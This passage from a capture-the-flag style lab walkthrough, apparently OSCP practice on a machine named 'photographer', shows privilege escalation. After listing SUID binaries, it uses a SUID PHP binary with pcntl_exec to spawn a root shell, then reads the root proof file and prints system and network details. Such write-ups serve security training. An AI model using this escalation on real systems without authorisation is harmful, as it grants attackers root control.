/usr/lib/policykit-1/polkit-agent-helper-1
/usr/sbin/pppd
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/php7.2
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/chfn
/bin/ntfs-3g
/bin/ping
/bin/fusermount
/bin/mount
/bin/ping6
/bin/umount
/bin/su

```
It looks like we have identified a SUID bit on PHP. Now we should check [GTFObins PHP SUID](https://gtfobins.github.io/gtfobins/php/#suid) on how we can use this to gain root privileges.

-----
## Privilege escalation

```bash
www-data@photographer:/$ CMD="/bin/sh"
```

```bash
www-data@photographer:/$ ./usr/bin/php7.2 -r "pcntl_exec('/bin/sh', ['-p']);"
```
Since we got a new bash loaded we should check the user and the id of the user to see if we really are the root user.
```bash
# whoami;id
root
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
```
Change the working direcotry to the root directory and check for the root flag.
```bash
# cd /root
# ls
proof.txt
```
Now let's put the commands together and execute them as they should during the OSCP exam. You must take a screenshot of this during the exam.
```bash
# whoami;id;hostname;ifconfig;cat proof.txt
root
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
photographer
enp0s3    Link encap:Ethernet  HWaddr 08:00:27:ee:a0:2a  
          inet addr:10.0.2.26  Bcast:10.0.2.255  Mask:255.255.255.0
          inet6 addr: fe80::342a:ab5a:c8a:b97b/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:109129 errors:0 dropped:0 overruns:0 frame:0
          TX packets:122099 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:16282909 (16.2 MB)  TX bytes:42999127 (42.9 MB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:1342 errors:0 dropped:0 overruns:0 frame:0
          TX packets:1342 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:1698073 (1.6 MB)  TX bytes:1698073 (1.6 MB)

                                                                   
                                .:/://::::///:-`                                
                            -/++:+`:--:o:  oo.-/+/:`                            
                         -++-.`o++s-y:/s: `sh:hy`:-/+:`                         
                       :o:``oyo/o`. `      ```/-so:+--+/`                       
                     -o:-`yh//.                 `./ys/-.o/                      
                    ++.-ys/:/y-                  /s-:/+/:/o`                    
                   o/ :yo-:hNN                   .MNs./+o--s`                   
                  ++ soh-/mMMN--.`            `.-/MMMd-o:+ -s                   
                 .y  /++:NMMMy-.``            ``-:hMMMmoss: +/                  
                 s-     hMMMN` shyo+:.    -/+syd+ :MMMMo     h                  
                 h     `MMMMMy./MMMMMd:  +mMMMMN--dMMMMd     s.                 
                 y     `MMMMMMd`/hdh+..+/.-ohdy--mMMMMMm     +-                 
                 h      dMMMMd:````  `mmNh   ```./NMMMMs     o.                 
                 y.     /MMMMNmmmmd/ `s-:o  sdmmmmMMMMN.     h`                 
                 :o      sMMMMMMMMs.        -hMMMMMMMM/     :o                  
                  s:     `sMMMMMMMo - . `. . hMMMMMMN+     `y`                  
                  `s-      +mMMMMMNhd+h/+h+dhMMMMMMd:     `s-                   
                   `s:    --.sNMMMMMMMMMMMMMMMMMMmo/.    -s.                    
                     /o.`ohd:`.odNMMMMMMMMMMMMNh+.:os/ `/o`                     
                      .++-`+y+/:`/ssdmmNNmNds+-/o-hh:-/o-                       
                        ./+:`:yh:dso/.+-++++ss+h++.:++-                         
                           -/+/-:-/y+/d:yh-o:+--/+/:`                           
                              `-///////////////:`                               
                                                                                

Follow me at: http://v1n1v131r4.com


d41d8cd98f00b204e9800998ecf8427e

```


